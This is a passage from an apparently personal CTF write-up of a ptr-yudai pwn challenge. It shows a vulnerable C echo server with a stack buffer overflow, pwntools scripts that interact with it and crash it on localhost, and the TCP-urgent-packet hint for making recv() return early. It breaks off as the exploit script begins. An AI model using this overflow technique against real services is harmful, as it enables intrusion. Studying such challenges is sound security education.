</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">setsockopt</span><span style="--0:#24292E;--1:#E1E4E8">(sfd, SOL_SOCKET, SO_REUSEADDR, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">yes, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(yes)) </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">perror</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;setsockopt(SO_REUSEADDR)&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> err;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">addr.sin_family </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> AF_INET;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">addr.sin_addr.s_addr </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">htonl</span><span style="--0:#24292E;--1:#E1E4E8">(INADDR_ANY);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">addr.sin_port </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">htons</span><span style="--0:#24292E;--1:#E1E4E8">(port);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">bind</span><span style="--0:#24292E;--1:#E1E4E8">(sfd, (</span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> sockaddr</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">addr, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(addr)) </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">perror</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;bind&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> err;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">listen</span><span style="--0:#24292E;--1:#E1E4E8">(sfd, </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">perror</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;listen&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> err;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code">
</div></div></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">clen </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(cli);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> ((cfd </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">accept</span><span style="--0:#24292E;--1:#E1E4E8">(sfd, (</span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> sockaddr</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">cli, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">clen)) </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">perror</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;accept&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> err;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">n </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">recv</span><span style="--0:#24292E;--1:#E1E4E8">(cfd, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">n, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">ssize_t</span><span style="--0:#24292E;--1:#E1E4E8">), MSG_WAITALL);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (n </span><span style="--0:#BF3441;--1:#F97583">&lt;=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> n </span><span style="--0:#BF3441;--1:#F97583">&gt;=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">200</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">54</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">recv</span><span style="--0:#24292E;--1:#E1E4E8">(cfd, buf, n, MSG_WAITALL);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">55</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">send</span><span style="--0:#24292E;--1:#E1E4E8">(cfd, buf, n, </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">56</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">57</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">58</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">59</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">60</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">err:</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">61</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (sfd </span><span style="--0:#BF3441;--1:#F97583">&gt;=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#6F42C1;--1:#B392F0">close</span><span style="--0:#24292E;--1:#E1E4E8">(sfd);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">62</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">63</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <netinet/in.h>#include <sys/socket.h>#include <sys/types.h>#include <unistd.h>int main(int argc, char **argv) {  struct sockaddr_in cli, addr = {0};  socklen_t clen;  int cfd, sfd = -1, yes = 1;  ssize_t n;  char buf[0x100];  unsigned short port = argc < 2 ? 31337 : atoi(argv[1]);  // listner setup  if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {    perror(&#34;socket&#34;);    goto err;  }  if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &#38;yes, sizeof(yes)) < 0) {    perror(&#34;setsockopt(SO_REUSEADDR)&#34;);    goto err;  }  addr.sin_family = AF_INET;  addr.sin_addr.s_addr = htonl(INADDR_ANY);  addr.sin_port = htons(port);  if (bind(sfd, (struct sockaddr*)&#38;addr, sizeof(addr)) < 0) {    perror(&#34;bind&#34;);    goto err;  }  if (listen(sfd, 1) < 0) {    perror(&#34;listen&#34;);    goto err;  }  clen = sizeof(cli);  if ((cfd = accept(sfd, (struct sockaddr*)&#38;cli, &#38;clen)) < 0) {    perror(&#34;accept&#34;);    goto err;  }  while (1) {    n = 0;    recv(cfd, &#38;n, sizeof(ssize_t), MSG_WAITALL);    if (n <= 0 || n >= 0x200)      break;    recv(cfd, buf, n, MSG_WAITALL);    send(cfd, buf, n, 0);  }  return 0;err:  if (sfd >= 0) close(sfd);  return 1;}"><div></div></button></div></figure></div>
<p>After entering the while loop, the <code>main()</code> function takes a number <code>n</code> which can be <code>&lt;= 0</code> or <code>&gt;= 0x200</code>. It then reads <code>n</code> bytes into the buffer <code>buf</code> using <code>recv()</code> with the <code>MSG_WAITALL</code> flag, meaning it waits until exactly <code>n</code> bytes are received before returning, and then echoes them back with <code>send()</code>.</p>
<p>We can quickly see a buffer overflow since <code>n</code> can be <code>&gt;= 0x200</code> while the buffer size is only <code>0x100</code>.</p>
<h3 id="exploitation">Exploitation</h3>
<p>So we have a buffer overflow, but how do we exploit it without any leaks? We can’t send a large <code>n</code> and provide fewer bytes to make <code>send()</code> leak uninitialized memory, because with <code>MSG_WAITALL</code>, <code>recv()</code> won’t return until it has received all <code>n</code> bytes.</p>
<p>Before jumping into exploitation, let’s look at how we can interact with the program. Since the default port is <code>31337</code>, we can run the program and try interacting with it using <code>pwntools</code>.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:42ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">for</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">i</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">in</span><span style="--0:#24292E;--1:#E1E4E8"> $(</span><span style="--0:#6F42C1;--1:#B392F0">seq</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">); </span><span style="--0:#BF3441;--1:#F97583">do</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">./chall</span><span style="--0:#24292E;--1:#E1E4E8"> ; </span><span style="--0:#BF3441;--1:#F97583">done</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ for i in $(seq 1 100); do ./chall ; done"><div></div></button></div></figure></div>
<p>Now let’s try to make it echo back some AAAAs:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:37ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;localhost&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">data </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;A&quot;</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#005CC5;--1:#79B8FF">8</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.send(p64(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(data)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.send(data)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">log.info(io.recv(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(data)).decode())</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *io = remote(&#34;localhost&#34;, 31337)data = b&#34;A&#34;*8io.send(p64(len(data)))io.send(data)log.info(io.recv(len(data)).decode())io.interactive()"><div></div></button></div></figure></div>
<p>What this does is that it sends first of all <code>n</code> which in this case is 8, then sends the actual data, and finally receives the same number of bytes to confirm the echo.</p>
<p><img src="/other-files/interacting.BhuJVmxS_zAr4R.webp" alt width="921" height="437" loading="lazy" decoding="async"></p>
<p>We can see that we get back exactly what we sent.</p>
<p>Now, that we have seen how to interact with the program let’s try to crash it by sending <code>0x1ff</code> amount of A’s.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:37ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;localhost&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">data </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;A&quot;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.send(p64(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(data)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.send(data)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">log.info(io.recv(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(data)).decode())</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *io = remote(&#34;localhost&#34;, 31337)data = b&#34;A&#34;*0x1ffio.send(p64(len(data)))io.send(data)log.info(io.recv(len(data)).decode())"><div></div></button></div></figure></div>
<p>We are not doing <code>io.interactive()</code> here cause once we drop the connection the program breaks out of the while loop and returns.</p>
<p>Running this we can confirm that we get a <code>stack smashing detected</code> cause we are overwriting the canary:</p>
<p><img src="/other-files/stack-smashing-detected.8gQDfZrV_Z283v6g.webp" alt width="1917" height="606" loading="lazy" decoding="async"></p>
<p>Now let’s cut to the chase and get to the main problem: how are we supposed to get leaks? Well, at this point I got stuck during the competition. I did find one interesting thing in the man pages of <code>recv()</code>:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="text" class="wrap" style="--ecMaxLine:65ch"><code><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">MSG_WAITALL (since Linux 2.2)</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">This flag requests that the operation block until the full</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">request is satisfied.  However, the call may still return</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">less data than requested if a signal is caught, an error or</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">disconnect occurs, or the next data to be received is of a</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">different type than that returned.  This flag has no effect</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">for datagram sockets.</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="MSG_WAITALL (since Linux 2.2)      This flag requests that the operation block until the full      request is satisfied.  However, the call may still return      less data than requested if a signal is caught, an error or      disconnect occurs, or the next data to be received is of a      different type than that returned.  This flag has no effect      for datagram sockets."><div></div></button></div></figure></div>
<blockquote>
<p><a href="https://man7.org/linux/man-pages/man2/recv.2.html" rel="nofollow noreferrer noopener" target="_blank">https://man7.org/linux/man-pages/man2/recv.2.html</a></p>
</blockquote>
<p>But I couldn’t figure out how to make it return early without shutting down the connection.</p>
<p>Since I wasn’t able to solve this during the competition, I can’t really tell you how I “solved this in five minutes” using some non-existent approach. Instead, we’ll go over the exploit that makes <code>recv()</code> return early, see how it works, and try to understand how we could have approached this.</p>
<p>After the competition ended, upon asking <code>ptr-yudai</code> (the challenge author) said that <strong>“you can interrupt recv by sending an URGENT TCP packet.”</strong></p>
<p>Giving this hint and the source code of the challenge to claude gave me this script:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:33ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> socket</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;localhost&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
